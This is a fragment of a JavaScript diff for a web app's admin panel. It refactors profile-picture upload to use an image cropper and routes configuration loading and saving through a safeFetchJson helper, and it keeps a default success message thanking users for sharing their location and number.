-      reader.readAsDataURL(file);
-    } catch (err) {
-      console.error('DP upload error:', err);
-      dpUploadStatus.textContent = '❌ Upload failed: ' + err.message;
-      dpUploadStatus.style.color = 'var(--accent-rose)';
-      alert('Failed to upload profile picture: ' + err.message);
-    } finally {
-      triggerUploadBtn.disabled = false;
-      dpFileInput.value = '';
-    }
+    const reader = new FileReader();
+    reader.onload = () => {
+      openImageCropper(reader.result);
+    };
+    reader.readAsDataURL(file);
+    dpFileInput.value = '';
   });
 }
 
 async function loadAdminConfig() {
   try {
-    const res = await fetch('/api/config');
-    const data = await res.json();
+    const data = await safeFetchJson('/api/config');
     if (data.success && data.config) {
       const c = data.config;
       if (cfgName) cfgName.value = c.profileName || '';
@@ -599,7 +1175,7 @@ async function loadAdminConfig() {
       if (cfgSuccessMessage) cfgSuccessMessage.value = c.successMessage || 'Thank you for sharing location & number! Mujhe need tha ye cheez ka, aapse mulaqat bahut jaldi hoga bhai ❤️🤝';
     }
   } catch (e) {
-    console.error('Failed to load config:', e);
+    console.error('Failed to load config:', e.message);
   }
 }
 
@@ -627,7 +1203,7 @@ if (configForm) {
     saveBtn.innerHTML = `<span>Saving...</span>`;
 
     try {
-      const res = await fetch('/api/admin/config', {
+      const data = await safeFetchJson('/api/admin/config', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -635,12 +1211,6 @@ if (configForm) {
         },
         body: JSON.stringify(payload)
       });
-
-      const data = await res.json();
-
-      if (!res.ok) {
-        throw new Error(data.error || 'Failed to save configuration');
-      }
 
       if (adminDpPreview && payload.profileImgUrl) {
         adminDpPreview.src = payload.profileImgUrl;
